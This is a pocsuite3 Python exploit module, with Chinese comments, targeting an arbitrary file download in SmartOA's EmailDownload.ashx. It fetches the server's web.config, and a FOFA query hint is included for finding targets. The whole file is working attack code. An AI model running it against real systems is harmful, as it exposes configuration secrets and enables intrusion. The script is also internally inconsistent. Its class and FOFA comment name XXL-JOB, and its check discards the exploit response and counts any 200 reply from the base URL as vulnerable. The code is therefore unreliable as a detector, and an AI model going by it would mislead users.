import sys

from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)

# 关于类的继承
class XXLJOBPOC(POCBase):
    # fofa语句: title="任务调度中心"
    vulID = "0"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "cccccc"  # PoC作者的大名
    vulDate = "2022-7-16"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-7-16"  # 编写 PoC 的日期
    updateDate = "2022-7-16"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%99%BA%E6%98%8E%20SmartOA%20EmailDownload.ashx%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md"]  # 漏洞地址来源,0day不用写
    name = "AVD-2022-1343458 存在任意文件下载 PoC"  # PoC 名称
    appPowerLink = "https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%99%BA%E6%98%8E%20SmartOA%20EmailDownload.ashx%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md"  # 漏洞厂商主页地址
    appName = "AVD-2022-1343458"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.ARBITRARY_FILE_DOWNLOAD  # 弱口令 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # poc对应的产品类型 web的
    # samples = []  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """ARBITRARY_FILE_DOWNLOAD存在任意文件下载"""  # 漏洞简要描述
    pocDesc = """输入命令下载文件"""  # POC用法描述
    cmdRet = ""
    def _check(self):
        full_url = self.url
        # 1.发请求
        import requests

        url = f"{full_url}/file/EmailDownload.ashx?url=~/web.config&name=web.config"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0",
                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                         "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate",
                         "DNT": "1", "Connection": "close", "If-Modified-Since": "Wed, 04 Sep 2019 09:09:04 GMT",
                         "If-None-Match": "\"368d2066063d51:0\""}
        requests.get(url, headers=headers)
        result = []
        try:
            response1 = requests.get(full_url, headers=headers, verify=False, timeout=5,
                                     allow_redirects=False)
            # response2 = requests.get(full_url,cookies=cookies, headers=headers, verify=False, timeout=5, allow_redirects=False)
            # res = response1.headers.get("X-Cmd-Response")
            # res = response1.headers.get("X-Cmd-Response")
            if response1.status_code == 200:
                print(f"[+]{url} 存在任意文件下载漏洞")
                result.append(self.url)
                self.cmdRet = response1.text
                # 3.回显命令执行的结果给用户
                # res = response2.text.split("<!DOCTYPE html>",1)[0].strip()
            else:
                print(f"[-]{url} 不存在任意文件下载漏洞")
        except Exception:
            print(f"[-]{url} 请求失败")
            # sys.exit(1)
        # 2.判断是否存在漏洞
        finally:
            return result

    def _verify(self):
        # 验证模式 , 调用检查代码 ,
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            # 这些信息会在终端上显示
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.cmdRet
        return self.parse_verify(result)

    def _attack(self):
        # 攻击模式 , 就是在调用验证模式
        return self._verify()

    def parse_verify(self, result):
        # 解析认证 , 输出
        output = Output(self)
        # 根据result的bool值判断是否有漏洞
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output

# 你会发现没有shell模式 , 对吧 ,根本就用不到

# 其他自定义的可添加的功能函数
def other_fuc():
    pass

# 其他工具函数
def other_utils_func():
    pass


# 注册 DemoPOC 类 , 必须要注册
register_poc(XXLJOBPOC)
